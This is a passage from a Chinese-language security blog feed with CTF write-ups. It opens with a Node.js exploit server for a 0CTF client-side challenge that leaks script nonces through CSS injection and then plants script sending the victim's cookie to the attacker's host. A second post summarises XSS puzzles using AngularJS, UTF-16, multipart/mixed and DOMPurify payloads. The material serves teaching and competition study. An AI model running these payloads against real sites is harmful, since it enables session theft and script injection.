property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">title=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;content=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getNotes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/share_diary/'</span> <span class="token operator">+</span> id<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">report</span><span class="token punctuation">(</span><span class="token parameter">username<span class="token punctuation">,</span> id</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>host<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/report?username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;id=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">res</span> <span class="token operator">=></span> res<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Hello World!'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/start'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  <span class="token comment">// create ccount</span>  username <span class="token operator">=</span> <span class="token function">getRandomStr</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  <span class="token keyword">let</span> password <span class="token operator">=</span> <span class="token function">getRandomStr</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>  leaks <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  hasToken <span class="token operator">=</span> <span class="token boolean">false</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    username<span class="token punctuation">,</span>    password  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> response <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span>cookieJar<span class="token punctuation">,</span> host <span class="token operator">+</span> <span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'post'</span><span class="token punctuation">,</span>    <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>      <span class="token string-property property">'content-type'</span><span class="token operator">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">&amp;password=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>password<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token keyword">const</span> resp <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token string">'note1'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;meta http-equiv="refresh" content="0;URL=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>selfHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp"></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span><span class="token string">'note2'</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;style>@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp1.css";@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp2.css";@import "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>cssUrl<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/exp3.css";&lt;/style></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'report username:'</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">report</span><span class="token punctuation">(</span>username<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'done'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/leak'</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    leaks<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">)</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'recevied:'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">,</span> leaks<span class="token punctuation">.</span>length<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>leaks<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">30</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token function">handleLeak</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment">// create a new note</span>      <span class="token keyword">await</span> <span class="token function">createNote</span><span class="token punctuation">(</span>        <span class="token string">'note3'</span><span class="token punctuation">,</span>         result<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">nonce</span> <span class="token operator">=></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe srcdoc="&lt;script nonce=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>nonce<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">>top.location='</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>selfHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/flag?q='+encodeURIComponent(top.document.cookie)&lt;/script>">&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">await</span> <span class="token function">share</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>      hasToken <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'note3 cteated'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'ok'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>query<span class="token punctuation">.</span>q<span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/hasToken'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'polling...'</span><span class="token punctuation">,</span> hasToken<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>hasToken<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'hasToken'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'no'</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/exp'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'visit exp'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">setHeader</span><span class="token punctuation">(</span><span class="token string">'content-type'</span><span class="token punctuation">,</span> <span class="token string">'text/html'</span><span class="token punctuation">)</span>  res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">    &lt;script>      let w = window.open('http://localhost/share/read#id=1&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">')      function polling() &#123;        fetch('/hasToken').then(res => res.text()).then((res) => &#123;          if (res === 'hasToken') &#123;            w.location = 'http://localhost/share/read#id=2&amp;username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">'          &#125;        &#125;)        setTimeout(() => &#123;          polling();        &#125;, 500)      &#125;      polling()    &lt;/script>  </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>port<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Example app listening on port </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>port<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>話說如果沒看過那篇文章的話，不確定自己是不是能想到這個解法 😅</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今年的 0CTF 一共有三道 web 題，其中一道題目是 client-side 的，我就只解這題而已，順利拿到 first blood，這篇簡單記錄一下心得。&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CSS injection&lt;/li&gt;
&lt;li&gt;CSS exfiltration&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>一堆來不及做的 web 與 XSS 題目</title>
    <link href="https://blog.huli.tw/2023/12/03/xss-and-web-challenges/"/>
    <id>https://blog.huli.tw/2023/12/03/xss-and-web-challenges/</id>
    <published>2023-12-03T04:40:00.000Z</published>
    <updated>2023-12-03T05:16:22.706Z</updated>
    
    <content type="html"><![CDATA[<p>因為最近有點忙的關係，這兩三個月比較少打 CTF 了，但還是會在推特上看到一些有趣的題目。雖然沒時間打，但筆記還是要記的，沒記的話下次看到鐵定還是做不出來。</p><p>這篇主要記一些網頁前端相關的題目，由於自己可能沒有實際下去解題，所以內容都是參考別人的筆記之後再記錄一些心得。</p><p>關鍵字列表：</p><ol><li>copy paste XSS</li><li>connection pool</li><li>content type UTF16</li><li>multipart&#x2F;mixed</li><li>Chrome DevTools Protocol</li><li>new headless mode default download</li><li>Scroll to Text Fragment (STTF)</li><li>webVTT cue xsleak</li><li>flask&#x2F;werkzeug cookie parsing quirks</li></ol><span id="more"></span><h2><span id="dom-based-race-condition">DOM-based race condition</span></h2><p>來源：<a href="https://twitter.com/ryotkak/status/1710291366654181749">https://twitter.com/ryotkak/status/1710291366654181749</a></p><p>題目很簡單，就給你一個可編輯的 div 加上 Angular，允許任何的 user interaction，要做到 XSS。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">contenteditable</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://angular-no-http3.ryotak.net/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>當初看到題目的時候有猜到應該跟 copy paste 有關，解答中有提到說在 <code>&lt;div contenteditable&gt;&lt;/div&gt;</code> 貼上內容時，是可以貼上 HTML 的。雖然瀏覽器後來有做 sanitizer，但並不會針對自訂的屬性。</p><p>也就是說，如果搭配其他 gadget 的話，還是有機會做到 XSS。</p><p>例如說作者的文章中提到的這個 pattern，因為有 AngularJS 的關係所以會執行程式碼：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">ng-app</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">ng-init</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>constructor.constructor('alert(1)')()<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但問題是使用者在貼入 payload 的時候，AngularJS 已經載入完畢了。載入完成的時候如果 payload 還不存在，那就不會被執行，所以需要延長 AngularJS 載入的時間。</p><p>最後作者是用 connection pool 來解決這問題的，就是把 pool 塞爆，就可以延長 script 的載入時間，在載入完成以前貼好 payload。</p><p>作者 writeup：<a href="https://blog.ryotak.net/post/dom-based-race-condition/">https://blog.ryotak.net/post/dom-based-race-condition/</a></p><h2><span id="罕見的-content-type-與-utf16">罕見的 Content-type 與 UTF16</span></h2><p>來源：<a href="https://twitter.com/avlidienbrunn/status/1703805922043220273">https://twitter.com/avlidienbrunn/status/1703805922043220273</a></p><p>題目如下：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*FROM php:7.0-apacheRUN a2dismod statusCOPY ./files/index.php /var/www/htmlCOPY ./files/harder.php /var/www/htmlEXPOSE 80*/</span><span class="token variable">$message</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'message'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'hello, world'</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'type'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/<span class="token interpolation"><span class="token variable">$type</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"X-Frame-Options: DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"plain"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"the message is: <span class="token interpolation"><span class="token variable">$message</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>The message is:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>hr</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/([^\s\w!-~]|")/'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span><span class="token variable">$message</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>solved by:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span> nobody yet!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以控制部分內容以及部分 content type，該怎麼做到 XSS？</p><p>第一招是讓 content type 為 <code>text/html; charset=UTF-16LE</code>，就可以讓瀏覽器把頁面解讀為 UTF16，控制輸出內容。</p><p>這招讓我想到了 <a href="https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/">UIUCTF 2022</a> 中的 modernism 那題。</p><p>第二招是先運用 content type header 的特性，當 response header 是 <code>Content-Type: text/x,image/gif</code> 時，因為 <code>text/x</code> 是非法的 content type，所以瀏覽器會優先看合法的 <code>image/gif</code>。</p><p>也就是說，儘管 content type 的前半段是寫死的，依然可以利用這個技巧覆蓋掉完整的 content type。而有一個古老的 content type 叫做 <code>multipart/mixed</code>，像是 response 版的 multipart&#x2F;form，可以輸出像這樣的 response：</p><pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 200 OKContent-type: multipart&#x2F;mixed;boundary&#x3D;&quot;8ormorebytes&quot;ignored_first_part_before_boundary--8ormorebytesContent-Type: text&#x2F;html&lt;img src&#x3D;x onerror&#x3D;alert(domain)&gt;--8ormorebytesignored_last_part<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>瀏覽器會挑自己看得懂的部分去 render，而 Firefox 有支援這個 content type。</p><p>話說這個 content type 還可以拿來繞過 CSP，可以參考這個連結：<a href="https://twitter.com/ankursundara/status/1723410507389129092">https://twitter.com/ankursundara/status/1723410507389129092</a></p><h2><span id="intigriti-october-2023-challenge">Intigriti October 2023 challenge</span></h2><p>題目：<a href="https://challenge-1023.intigriti.io/">https://challenge-1023.intigriti.io/</a></p><p>在後端有個注入點：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Intigriti XSS Challenge - &lt;%- title %><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>這個 title 來自於：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> <span class="token function-variable function">getTitle</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">path</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    path <span class="token operator">=</span> <span class="token function">decodeURIComponent</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    path <span class="token operator">=</span> path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> DOMPurify<span class="token punctuation">.</span><span class="token function">sanitize</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>雖然說是 DOMPurify，看似不可繞過，但其實用 <code>&lt;div id=&quot;&lt;/title&gt;&lt;h1&gt;hello&lt;/h1&gt;&quot;&gt;</code> 可以閉合前面的 <code>&lt;title&gt;</code>，就可以注入任意 tag。</p><p>但這題的 input 是來自於 path，所以要把一些 <code>/</code> 